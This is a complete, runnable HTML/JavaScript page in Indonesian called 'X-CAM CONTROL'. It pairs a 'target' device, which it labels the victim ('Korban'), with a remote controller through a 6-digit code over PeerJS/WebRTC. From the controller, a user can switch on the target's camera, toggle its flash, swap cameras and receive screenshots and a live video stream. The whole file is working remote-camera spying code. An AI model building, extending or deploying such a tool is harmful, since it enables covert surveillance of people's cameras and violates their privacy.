<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>X-CAM CONTROL | Angka + Controller Aktifkan Kamera</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0f1a;
            font-family: 'Courier New', monospace;
            color: #0f0;
            padding: 16px;
        }
        .container { max-width: 800px; margin: 0 auto; }
        .mode-selector {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
            background: #000000aa;
            padding: 12px;
            border-radius: 40px;
            backdrop-filter: blur(8px);
        }
        .mode-btn {
            flex: 1;
            background: #111;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 12px;
            font-weight: bold;
            border-radius: 40px;
            cursor: pointer;
            text-align: center;
        }
        .mode-btn.active {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 12px #0f0;
        }
        .panel {
            background: #000000aa;
            border: 1px solid #0f0;
            border-radius: 24px;
            padding: 18px;
            backdrop-filter: blur(8px);
            margin-bottom: 20px;
        }
        video {
            width: 100%;
            background: #000;
            border-radius: 16px;
            border: 1px solid #0f0;
            transform: scaleX(-1);
        }
        .controls {
            display: flex;
            flex-wrap: wrap;
            gap: 12px;
            margin: 15px 0;
        }
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 10px 16px;
            font-weight: bold;
            font-family: monospace;
            border-radius: 40px;
            cursor: pointer;
        }
        input, .code-box {
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 10px;
            width: 100%;
            font-family: monospace;
            border-radius: 12px;
            margin: 8px 0;
            text-align: center;
            font-size: 1.5rem;
            letter-spacing: 4px;
        }
        .log {
            background: #000;
            padding: 8px;
            height: 120px;
            overflow-y: auto;
            font-size: 11px;
            border-radius: 12px;
        }
        .status {
            background: #0f0;
            color: #000;
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-weight: bold;
        }
        .flex { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
        @media (max-width: 600px) {
            body { padding: 8px; }
            .controls button { padding: 8px 12px; font-size: 12px; }
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
<div class="container">
    <div class="mode-selector" id="modeSelector">
        <div class="mode-btn" data-mode="target">📱 MODE TARGET (Korban)</div>
        <div class="mode-btn" data-mode="controller">🎮 MODE CONTROLLER</div>
    </div>

    <!-- Panel Target -->
    <div id="targetPanel" class="panel" style="display: none;">
        <h3>🔴 MODE TARGET - MENUNGGU PERINTAH DARI CONTROLLER</h3>
        <div class="flex"><span class="status">📡 STATUS: </span><span id="targetStatus">Menunggu koneksi</span></div>
        <div><p>🔑 KODE ANGKA TARGET (6 digit):</p>
            <div class="code-box" id="targetCodeDisplay">------</div>
            <button id="refreshCodeBtn">🔄 GENERATE KODE BARU</button>
        </div>
        <video id="targetVideo" autoplay playsinline muted style="display:none;"></video>
        <div class="log" id="targetLog"></div>
    </div>

    <!-- Panel Controller -->
    <div id="controllerPanel" class="panel" style="display: none;">
        <h3>🎮 MODE CONTROLLER - KENDALIKAN TARGET</h3>
        <div class="flex"><span class="status">🔗 KONEKSI: </span><span id="connStatus">Terputus</span></div>
        <div><p>📲 MASUKKAN KODE ANGKA TARGET (6 digit):</p>
            <input type="text" id="targetCodeInput" maxlength="6" placeholder="contoh: 123456" style="text-align:center; font-size:1.5rem;">
            <button id="connectBtn">🔗 HUBUNGKAN & AKTIFKAN KAMERA</button>
        </div>
        <video id="remoteVideo" autoplay playsinline muted></video>
        <div class="controls">
            <button id="controllerFlashBtn">💡 FLASH TARGET</button>
            <button id="controllerSwitchCamBtn">🔄 GANTI KAMERA (Depan/Belakang)</button>
            <button id="captureBtn">📸 SCREENSHOT</button>
        </div>
        <div id="captureResult"></div>
        <div class="log" id="controllerLog"></div>
    </div>
</div>

<script>
    // ======================== GLOBAL ========================
    let currentMode = "target";
    let peer = null;
    let localStream = null;      // untuk target
    let remoteStream = null;     // untuk controller
    let conn = null;             // data channel
    let call = null;
    let currentFacingMode = "environment"; // 'user' depan, 'environment' belakang
    let flashEnabled = false;
    let currentTargetCode = "";   // kode 6 digit untuk target

    const targetPanel = document.getElementById('targetPanel');
    const controllerPanel = document.getElementById('controllerPanel');
    const modeBtns = document.querySelectorAll('.mode-btn');
    const targetVideo = document.getElementById('targetVideo');
    const remoteVideo = document.getElementById('remoteVideo');
    const targetStatusSpan = document.getElementById('targetStatus');
    const connStatusSpan = document.getElementById('connStatus');
    const targetLogDiv = document.getElementById('targetLog');
    const controllerLogDiv = document.getElementById('controllerLog');
    const targetCodeDisplay = document.getElementById('targetCodeDisplay');
    const refreshCodeBtn = document.getElementById('refreshCodeBtn');
    const targetCodeInput = document.getElementById('targetCodeInput');
    const connectBtn = document.getElementById('connectBtn');

    function addLog(element, msg) {
        const d = document.createElement('div');
        d.innerHTML = `❯ ${msg}`;
        element.appendChild(d);
        element.scrollTop = element.scrollHeight;
        console.log(msg);
    }

    // ======================== MODE TARGET ========================
    async function initTargetMode() {
        if (peer) peer.destroy();
        // Generate kode 6 digit acak
        generateNewCode();
        // Buat peer dengan ID = kode angka
        peer = new Peer(currentTargetCode, {
            config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
        });
        peer.on('open', id => {
            addLog(targetLogDiv, `Target siap dengan kode: ${id}`);
            targetStatusSpan.innerText = "Menunggu controller...";
        });
        peer.on('connection', incomingConn => {
            conn = incomingConn;
            addLog(targetLogDiv, "Controller terhubung via data channel!");
            targetStatusSpan.innerText = "Controller terhubung, menunggu perintah kamera...";
            setupTargetDataChannel(conn);
        });
        peer.on('call', async incomingCall => {
            addLog(targetLogDiv, "Controller meminta video stream...");
            if (localStream) {
                incomingCall.answer(localStream);
                call = incomingCall;
                addLog(targetLogDiv, "✅ Video stream dikirim ke controller");
                targetStatusSpan.innerText = "Streaming aktif";
            } else {
                addLog(targetLogDiv, "❌ Kamera belum diaktifkan oleh controller, kirim perintah startCamera dulu!");
                incomingCall.close();
            }
        });
        peer.on('error', err => {
            if (err.type === 'unavailable-id') {
                addLog(targetLogDiv, `Kode ${currentTargetCode} sudah dipakai, generate ulang...`);
                generateNewCode();
                initTargetMode(); // restart dengan kode baru
            } else {
                addLog(targetLogDiv, `Peer error: ${err}`);
            }
        });
    }

    function generateNewCode() {
        let code = Math.floor(100000 + Math.random() * 900000).toString();
        currentTargetCode = code;
        targetCodeDisplay.innerText = code;
    }

    function setupTargetDataChannel(connection) {
        connection.on('data', async (data) => {
            if (data.type === 'command') {
                addLog(targetLogDiv, `Perintah dari controller: ${data.cmd}`);
                await handleTargetCommand(data.cmd);
            }
        });
        connection.on('close', () => {
            addLog(targetLogDiv, "Controller putus");
            targetStatusSpan.innerText = "Controller putus";
            // matikan stream kalau ada
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
                localStream = null;
                targetVideo.style.display = 'none';
                targetVideo.srcObject = null;
            }
        });
    }

    async function handleTargetCommand(cmd) {
        switch(cmd) {
            case 'startCamera':
                await enableCameraFromController();
                break;
            case 'toggleFlash':
                await toggleFlashTarget();
                break;
            case 'switchCamera':
                await switchCamera();
                break;
            case 'capture':
                captureAndSend();
                break;
            default:
                addLog(targetLogDiv, `Unknown command: ${cmd}`);
        }
    }

    async function enableCameraFromController() {
        if (localStream) {
            addLog(targetLogDiv, "Kamera sudah aktif");
            return;
        }
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: currentFacingMode } },
                audio: false
            });
            localStream = stream;
            targetVideo.srcObject = stream;
            targetVideo.style.display = 'block';
            addLog(targetLogDiv, "Kamera diaktifkan oleh controller!");
            targetStatusSpan.innerText = "Kamera ON - streaming";
            // Jika sudah ada call yang tertunda, jawab
            if (call && !call._answer) {
                call.answer(localStream);
            }
            // Jika belum ada call, tunggu
        } catch (err) {
            addLog(targetLogDiv, `Gagal akses kamera: ${err.message}`);
            if (conn) conn.send({ type: 'error', msg: err.message });
        }
    }

    async function toggleFlashTarget() {
        if (!localStream) {
            addLog(targetLogDiv, "Kamera belum diaktifkan");
            return;
        }
        const track = localStream.getVideoTracks()[0];
        if (!track.getCapabilities().torch) {
            addLog(targetLogDiv, "Flash tidak support");
            return;
        }
        flashEnabled = !flashEnabled;
        await track.applyConstraints({ advanced: [{ torch: flashEnabled }] });
        addLog(targetLogDiv, `Flash ${flashEnabled ? "ON" : "OFF"}`);
        if (conn) conn.send({ type: 'flashStatus', state: flashEnabled });
    }

    async function switchCamera() {
        if (!localStream) return;
        currentFacingMode = currentFacingMode === 'environment' ? 'user' : 'environment';
        const newStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { exact: currentFacingMode } },
            audio: false
        });
        const newVideoTrack = newStream.getVideoTracks()[0];
        const oldVideoTrack = localStream.getVideoTracks()[0];
        localStream.removeTrack(oldVideoTrack);
        localStream.addTrack(newVideoTrack);
        targetVideo.srcObject = localStream;
        if (call && call.peerConnection) {
            const sender = call.peerConnection.getSenders().find(s => s.track?.kind === 'video');
            if (sender) sender.replaceTrack(newVideoTrack);
        }
        addLog(targetLogDiv, `Kamera ganti ke ${currentFacingMode === 'user' ? 'DEPAN' : 'BELAKANG'}`);
    }

    function captureAndSend() {
        if (!targetVideo.videoWidth) {
            addLog(targetLogDiv, "Video belum siap");
            return;
        }
        const canvas = document.createElement('canvas');
        canvas.width = targetVideo.videoWidth;
        canvas.height = targetVideo.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(targetVideo, 0, 0);
        const imgData = canvas.toDataURL('image/png');
        if (conn) conn.send({ type: 'capture', imageData: imgData });
        addLog(targetLogDiv, "Screenshot dikirim ke controller");
    }

    refreshCodeBtn.addEventListener('click', () => {
        if (peer) peer.destroy();
        generateNewCode();
        initTargetMode();
    });

    // ======================== MODE CONTROLLER ========================
    function initControllerMode() {
        if (peer) peer.destroy();
        peer = new Peer({
            config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
        });
        peer.on('open', id => {
            addLog(controllerLogDiv, `Controller ID: ${id}`);
        });
        peer.on('error', err => addLog(controllerLogDiv, `Error: ${err}`));
    }

    function connectToTarget(targetCode) {
        if (!peer) {
            addLog(controllerLogDiv, "Peer belum siap, coba lagi");
            return;
        }
        addLog(controllerLogDiv, `Menghubungi target dengan kode ${targetCode}...`);
        // data channel
        const dataConn = peer.connect(targetCode);
        dataConn.on('open', () => {
            addLog(controllerLogDiv, "Data channel terbuka");
            conn = dataConn;
            connStatusSpan.innerText = "Terhubung (data)";
            setupControllerDataChannel(conn);
            // Kirim perintah untuk menyalakan kamera
            sendControllerCommand('startCamera');
        });
        dataConn.on('error', err => addLog(controllerLogDiv, `Data conn error: ${err}`));

        // video call
        const videoCall = peer.call(targetCode, null);
        videoCall.on('stream', stream => {
            addLog(controllerLogDiv, "✅ Video stream dari target diterima!");
            remoteStream = stream;
            remoteVideo.srcObject = stream;
            connStatusSpan.innerText = "Terhubung + video";
        });
        videoCall.on('error', err => addLog(controllerLogDiv, `Call error: ${err}`));
    }

    function setupControllerDataChannel(connection) {
        connection.on('data', (data) => {
            if (data.type === 'capture') {
                const resultDiv = document.getElementById('captureResult');
                resultDiv.innerHTML = `<img src="${data.imageData}" style="max-width:100%; border:1px solid #0f0;"><br><a href="${data.imageData}" download="screenshot.png">Download</a>`;
                addLog(controllerLogDiv, "Screenshot dari target diterima");
            } else if (data.type === 'flashStatus') {
                addLog(controllerLogDiv, `Flash target ${data.state ? "ON" : "OFF"}`);
            } else if (data.type === 'error') {
                addLog(controllerLogDiv, `Error dari target: ${data.msg}`);
            }
        });
    }

    function sendControllerCommand(cmd) {
        if (conn && conn.open) {
            conn.send({ type: 'command', cmd: cmd });
            addLog(controllerLogDiv, `Perintah dikirim: ${cmd}`);
        } else {
            addLog(controllerLogDiv, "Tidak terhubung ke target!");
        }
    }

    connectBtn.addEventListener('click', () => {
        const code = targetCodeInput.value.trim();
        if (!code || code.length !== 6 || isNaN(code)) {
            alert("Masukkan kode angka 6 digit yang valid!");
            return;
        }
        connectToTarget(code);
    });

    document.getElementById('controllerFlashBtn')?.addEventListener('click', () => sendControllerCommand('toggleFlash'));
    document.getElementById('controllerSwitchCamBtn')?.addEventListener('click', () => sendControllerCommand('switchCamera'));
    document.getElementById('captureBtn')?.addEventListener('click', () => sendControllerCommand('capture'));

    // ======================== SWITCH MODE ========================
    function setMode(mode) {
        currentMode = mode;
        if (mode === 'target') {
            targetPanel.style.display = 'block';
            controllerPanel.style.display = 'none';
            initTargetMode();
        } else {
            targetPanel.style.display = 'none';
            controllerPanel.style.display = 'block';
            initControllerMode();
        }
        modeBtns.forEach(btn => {
            if (btn.dataset.mode === mode) btn.classList.add('active');
            else btn.classList.remove('active');
        });
    }

    modeBtns.forEach(btn => {
        btn.addEventListener('click', () => setMode(btn.dataset.mode));
    });

    // default target mode
    setMode('target');
</script>
</body>
</html>
